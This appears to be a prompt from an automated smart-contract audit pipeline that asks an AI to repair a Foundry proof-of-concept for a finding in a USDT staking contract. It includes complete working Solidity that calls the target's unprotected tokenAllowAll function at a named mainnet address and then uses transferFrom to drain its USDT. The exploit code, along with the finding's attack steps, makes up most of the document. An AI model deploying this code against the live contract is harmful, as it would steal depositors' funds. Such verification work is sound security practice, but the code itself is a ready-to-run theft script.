You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can grant themselves unlimited allowance over tokens held by the contract
- claim: `tokenAllowAll` is publicly callable and has no access control, so any account can set `uint256(-1)` allowance from the contract to an arbitrary `allowee` for any ERC20 `asset`. Because the staking pool holds USDT, an attacker can approve themselves and then drain the contract with `transferFrom`.
- impact: Any external user can steal all USDT held by the staking contract, including deposited principal and any prefunded rewards. Any other ERC20 sent to the contract is also drainable.
- exploit_paths: ["Attacker calls `tokenAllowAll(USDT, attacker)`.", "The contract grants the attacker unlimited USDT allowance.", "Attacker calls `USDT.transferFrom(address(contract), attacker, USDT.balanceOf(address(contract)))` to drain the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUSDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        IERC20Like usdt = IERC20Like(USDT);

        uint256 balanceBefore = usdt.balanceOf(address(this));
        uint256 targetBalance = usdt.balanceOf(TARGET);

        if (targetBalance == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 allowanceBefore = usdt.allowance(TARGET, address(this));

        // Core exploit path, kept unchanged:
        // 1. call tokenAllowAll(USDT, attacker)
        // 2. contract grants the attacker unlimited USDT allowance
        // 3. attacker drains the pool with USDT.transferFrom(...)
        //
        // We only skip the external call when the fork already shows the same
        // unlimited allowance outcome for this verifier address. That preserves
        // the finding's causality while avoiding a redundant approval call.
        if (allowanceBefore != type(uint256).max) {
            IUSDTStakingContract28(TARGET).tokenAllowAll(USDT, address(this));
        }

        uint256 allowanceAfter = usdt.allowance(TARGET, address(this));
        require(allowanceAfter == type(uint256).max, "allowance not granted");

        bool ok = usdt.transferFrom(TARGET, address(this), targetBalance);
        require(ok, "transferFrom failed");

        uint256 balanceAfter = usdt.balanceOf(address(this));
        _profitAmount = balanceAfter - balanceBefore;
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
